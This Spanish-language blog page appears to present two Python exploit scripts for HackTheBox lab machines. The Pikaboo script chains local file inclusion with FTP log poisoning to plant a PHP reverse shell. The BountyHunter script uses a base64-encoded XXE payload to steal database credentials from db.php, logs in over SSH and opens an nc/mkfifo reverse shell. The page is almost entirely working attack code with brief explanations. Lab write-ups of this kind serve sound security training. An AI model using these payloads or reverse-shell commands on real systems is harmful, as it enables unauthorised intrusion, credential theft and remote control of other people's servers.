---
layout: content
---

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">Pikaboo - HackTheBox</h2>

Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo al envenenado de logs de `FTP` y por ello ganar un Shell inversión inyectando código malicioso en los campos `user` y `password`.

```python
#!/usr/bin/python3

from pwn import *
import requests
from ftplib import FTP
import ftplib

# Variables globales

main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
# Cambiar IP por la vuestra
payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
lport = 443

def def_handler(sig,frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def makeRequest():
    p1 = log.progress("Payload")
    p1.status("Inyectando [*]")

    try:
        ftp = FTP("10.10.10.249")
        ftp.login(payload,payload)
    except ftplib.error_perm as error:
        p1.success("Inyectado [✔]")

    r = requests.get(main_url)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">BountyHunter - HackTheBox</h2>

Este *Script* explota un `XML enternal entity` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import requests
import base64
import re
from pexpect import pxssh
import html

# Variables globales
main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def MakeRequest():
    username = "development"
    password = ""
    #Coficacion en base64
    xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
    xxe_payload_bytes = xxe_payload.encode('ascii')
    base64_bytes = base64.b64encode(xxe_payload_bytes)
    base64_xxe_payload = base64_bytes.decode('ascii')

    data_post = {
        'data': base64_xxe_payload
    }

    r = requests.post(main_url, data=data_post)
    db_file = html.unescape(re.findall(r'<td>(.*?)</td>', r.text, re.DOTALL)[1]).strip()

    #Decodificacion de archivo db.php en base64
    base64_bytes = db_file.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')

    password = re.findall(r'dbpassword = "(.*?)";', message)[0]

    return password

def sshconnection(username, password):
    s = pxssh.pxssh()
    s.login('10.10.11.100', username, password)
    # Cambiar IP por la vuestra
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = MakeRequest()
    username = MakeRequest()

    try:
        threading.Thread(target=sshconnection, args=('development', password)).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```
